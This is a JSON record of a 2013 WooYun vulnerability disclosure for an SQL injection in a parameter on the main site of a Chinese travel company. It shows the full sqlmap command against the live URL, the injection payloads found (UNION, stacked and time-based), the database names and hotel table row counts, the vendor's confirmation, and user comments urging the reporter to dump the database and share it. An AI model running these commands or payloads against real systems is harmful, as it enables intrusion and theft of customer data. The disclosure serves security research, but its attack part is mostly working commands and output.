{"id": 6234, "wybug_id": "wooyun-2013-046553", "wybug_title": "同程旅游网主站SQL注入漏洞#1", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "秋风", "wybug_date": "2013-12-20 16:14", "wybug_open_date": "2014-02-03 16:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向公众公开  简要描述： 好多裤，好多表，好多好多数据。。。。 详细说明：  \n注入点:http://www.17u.cn/dujia/AjaxCallNew.aspx?lineId=40202&MId=113&type=GetPrintContent\nget参数MId存在注入通知存在注入点，未做进一步测试！\npython sqlmap.py -u \"www.17u.cn/dujia/AjaxCallNew.aspx?lineId=40202&MId=113&type=GetPrintContent\" --batch -p \"MId\" --dbs --count -D TCHotelsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: MId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: lineId=40202&MId=113 AND 2988=2988&type=GetPrintContent    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: lineId=40202&MId=-4973 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(97)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(72)+CHAR(122)+CHAR(101)+CHAR(84)+CHAR(99)+CHAR(90)+CHAR(73)+CHAR(78)+CHAR(79)+CHAR(113)+CHAR(102)+CHAR(120)+CHAR(102)+CHAR(113)-- &type=GetPrintContent    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: lineId=40202&MId=113; WAITFOR DELAY '0:0:5'--&type=GetPrintContent    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: lineId=40202&MId=113 WAITFOR DELAY '0:0:5'--&type=GetPrintContent---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008available databases [20]:                                                                                                                                                 [*] 17u_net[*] IpData[*] master[*] model[*] msdb[*] TCB2cBlog[*] TCB2cWenDa[*] TCCar[*] TCCLineOrder[*] TCCLineResource[*] TCCLineWeb[*] TCEbook[*] TCFlyPageMonitorDB[*] TCFlyUtility[*] TCHolidayCrawl[*] TCHotel[*] TCHotelResource[*] TCMapBarDataClass[*] TCShare[*] tempdbDatabase: TCHotel                                                                                                                                                         +--------------------------------------+---------+| Table                                | Entries |+--------------------------------------+---------+| dbo.HotelSMSHistory                  | 11009644 || dbo.HotelMemberLevel                 | 5775504 || dbo.HotelSystemDealLog               | 3995100 || dbo.HotelGroupbuyOrderLog            | 2210128 || dbo.HotelFeedBackExtend              | 2175113 || dbo.HotelFeedBackExtend              | 2175113 || dbo.HotelInfoRoomState               | 2029805 || dbo.MemberFirstCall                  | 1901584 || dbo.HotelSystemMonitorLog            | 1722171 || dbo.HotelGroupbuyTickets             | 1129813 || dbo.HotelDianpingDealLog             | 1104526 || dbo.HotelOrderExChangeLogExtend      | 1081474 || dbo.EHotelEBookingInfoRemind         | 930794  || dbo.HotelRoomTypeDanBaoInfo          | 820389  || dbo.HotelPicLabelRelation            | 736767  || dbo.HotelMissCall_AWY                | 599958  || dbo.HotelMissCall_AWY                | 599958  || dbo.HotelVerifyAccountLog            | 308187  || dbo.HolidayHotelRealStatus           | 234056  || dbo.HotelEBookingSupplierRelation    | 62016   || dbo.HotelScenery                     | 59268   || dbo.HotelBusinessRelation            | 56379   || dbo.HotelBookDealScheduling          | 47921   || dbo.HoteleBookingUser                | 41579   || dbo.HotelRefund                      | 38366   || dbo.HoteleBookingManageRelation      | 37635   || dbo.HotelHotSpotHotelRelation        | 36445   || dbo.HotelHotSpotHotelRelation        | 36445   || dbo.HotelControlFeedBack             | 31784   || dbo.ctripHotel                       | 14592   || dbo.IdGenerator                      | 13567   || dbo.HolidayHotelAttrRelation         | 11495   || dbo.HotelHotScenicRelation           | 11134   || dbo.HotelFaxSendStation              | 10617   || dbo.HotelHotSpotLabelRelation        | 8987    || dbo.HotelLinkManLog                  | 7162    || dbo.HotelLinkManLog                  | 7162    || dbo.HotelSpecialTypeRelation         | 6417    || dbo.HolidayHotelPolicyRelation       | 5426    || dbo.HotelCRMSysUser                  | 4106    || dbo.BusinessSection                  | 4078    || dbo.HotelTuiJian                     | 3651    || dbo.MemberHotelRecommend             | 2154    || dbo.HotelHotPosition                 | 1842    || dbo.HotelCityChain                   | 1635    || dbo.HotelPublicTagRelation           | 1578    || dbo.SubwayInfo                       | 1417    || dbo.DataDictionary                   | 980     || dbo.HotelCheckCityInfo               | 921     || dbo.HotelNoShowType                  | 889     || dbo.HotelHotScenic                   | 720     || dbo.HotelInferior                    | 678     || dbo.EHotelEbookingGuestBook          | 613     || dbo.HotelCRMFunction                 | 452     || dbo.HotelCRMDEP                      | 220     || dbo.HolidayHotelCityKeyword          | 172     || dbo.HotelOrderDataDictionary         | 157     || dbo.HotelCityPriceRange              | 156     || dbo.HotelDeptProvinceModel           | 132     || dbo.EHotelEbookingNotice             | 112     || dbo.Sys_Parameter                    | 109     || dbo.HotelFaxWithOutRelation          | 104     || dbo.HotelBookDealClasses             | 97      || dbo.HotelOrderCancelReasonDictionary | 78      || dbo.HotelFeaturesPermissions         | 77      || dbo.HotelCityFacility                | 53      || dbo.HotelAdsSet                      | 52      || dbo.HotelSubtractPointDeal           | 48      || dbo.HotelFeedBackReasonDictionary    | 47      || dbo.HotelBookDealWorkType            | 31      || dbo.HotelSpecialLabel                | 26      || dbo.EHotelEbookingRight              | 25      || dbo.HotelTemplate                    | 24      || dbo.HotelFaxTemplate                 | 17      || dbo.HotelPageInfoControl             | 4       || dbo.HotelSpecialLabelRelation        | 2       |+--------------------------------------+---------+\n   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-23 08:08 厂商回复： 正在处理中，感谢 @秋风 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-20 16:22 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  收购wb，比例1:6    \n     2013-12-20 19:18 |    \t\tg00 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 终于进来了~)\t\t \n  楼主，先脱裤啊~~~~~拖完了找我下~    \n     2013-12-20 19:55 |    \t\tlpcdma \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 人类)\t\t \n  裤子里有几百万吧。    \n     2013-12-20 23:01 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  洞主你好给力啊    \n     2013-12-20 23:41 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  @g00 你拿到手给我一份就ok    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}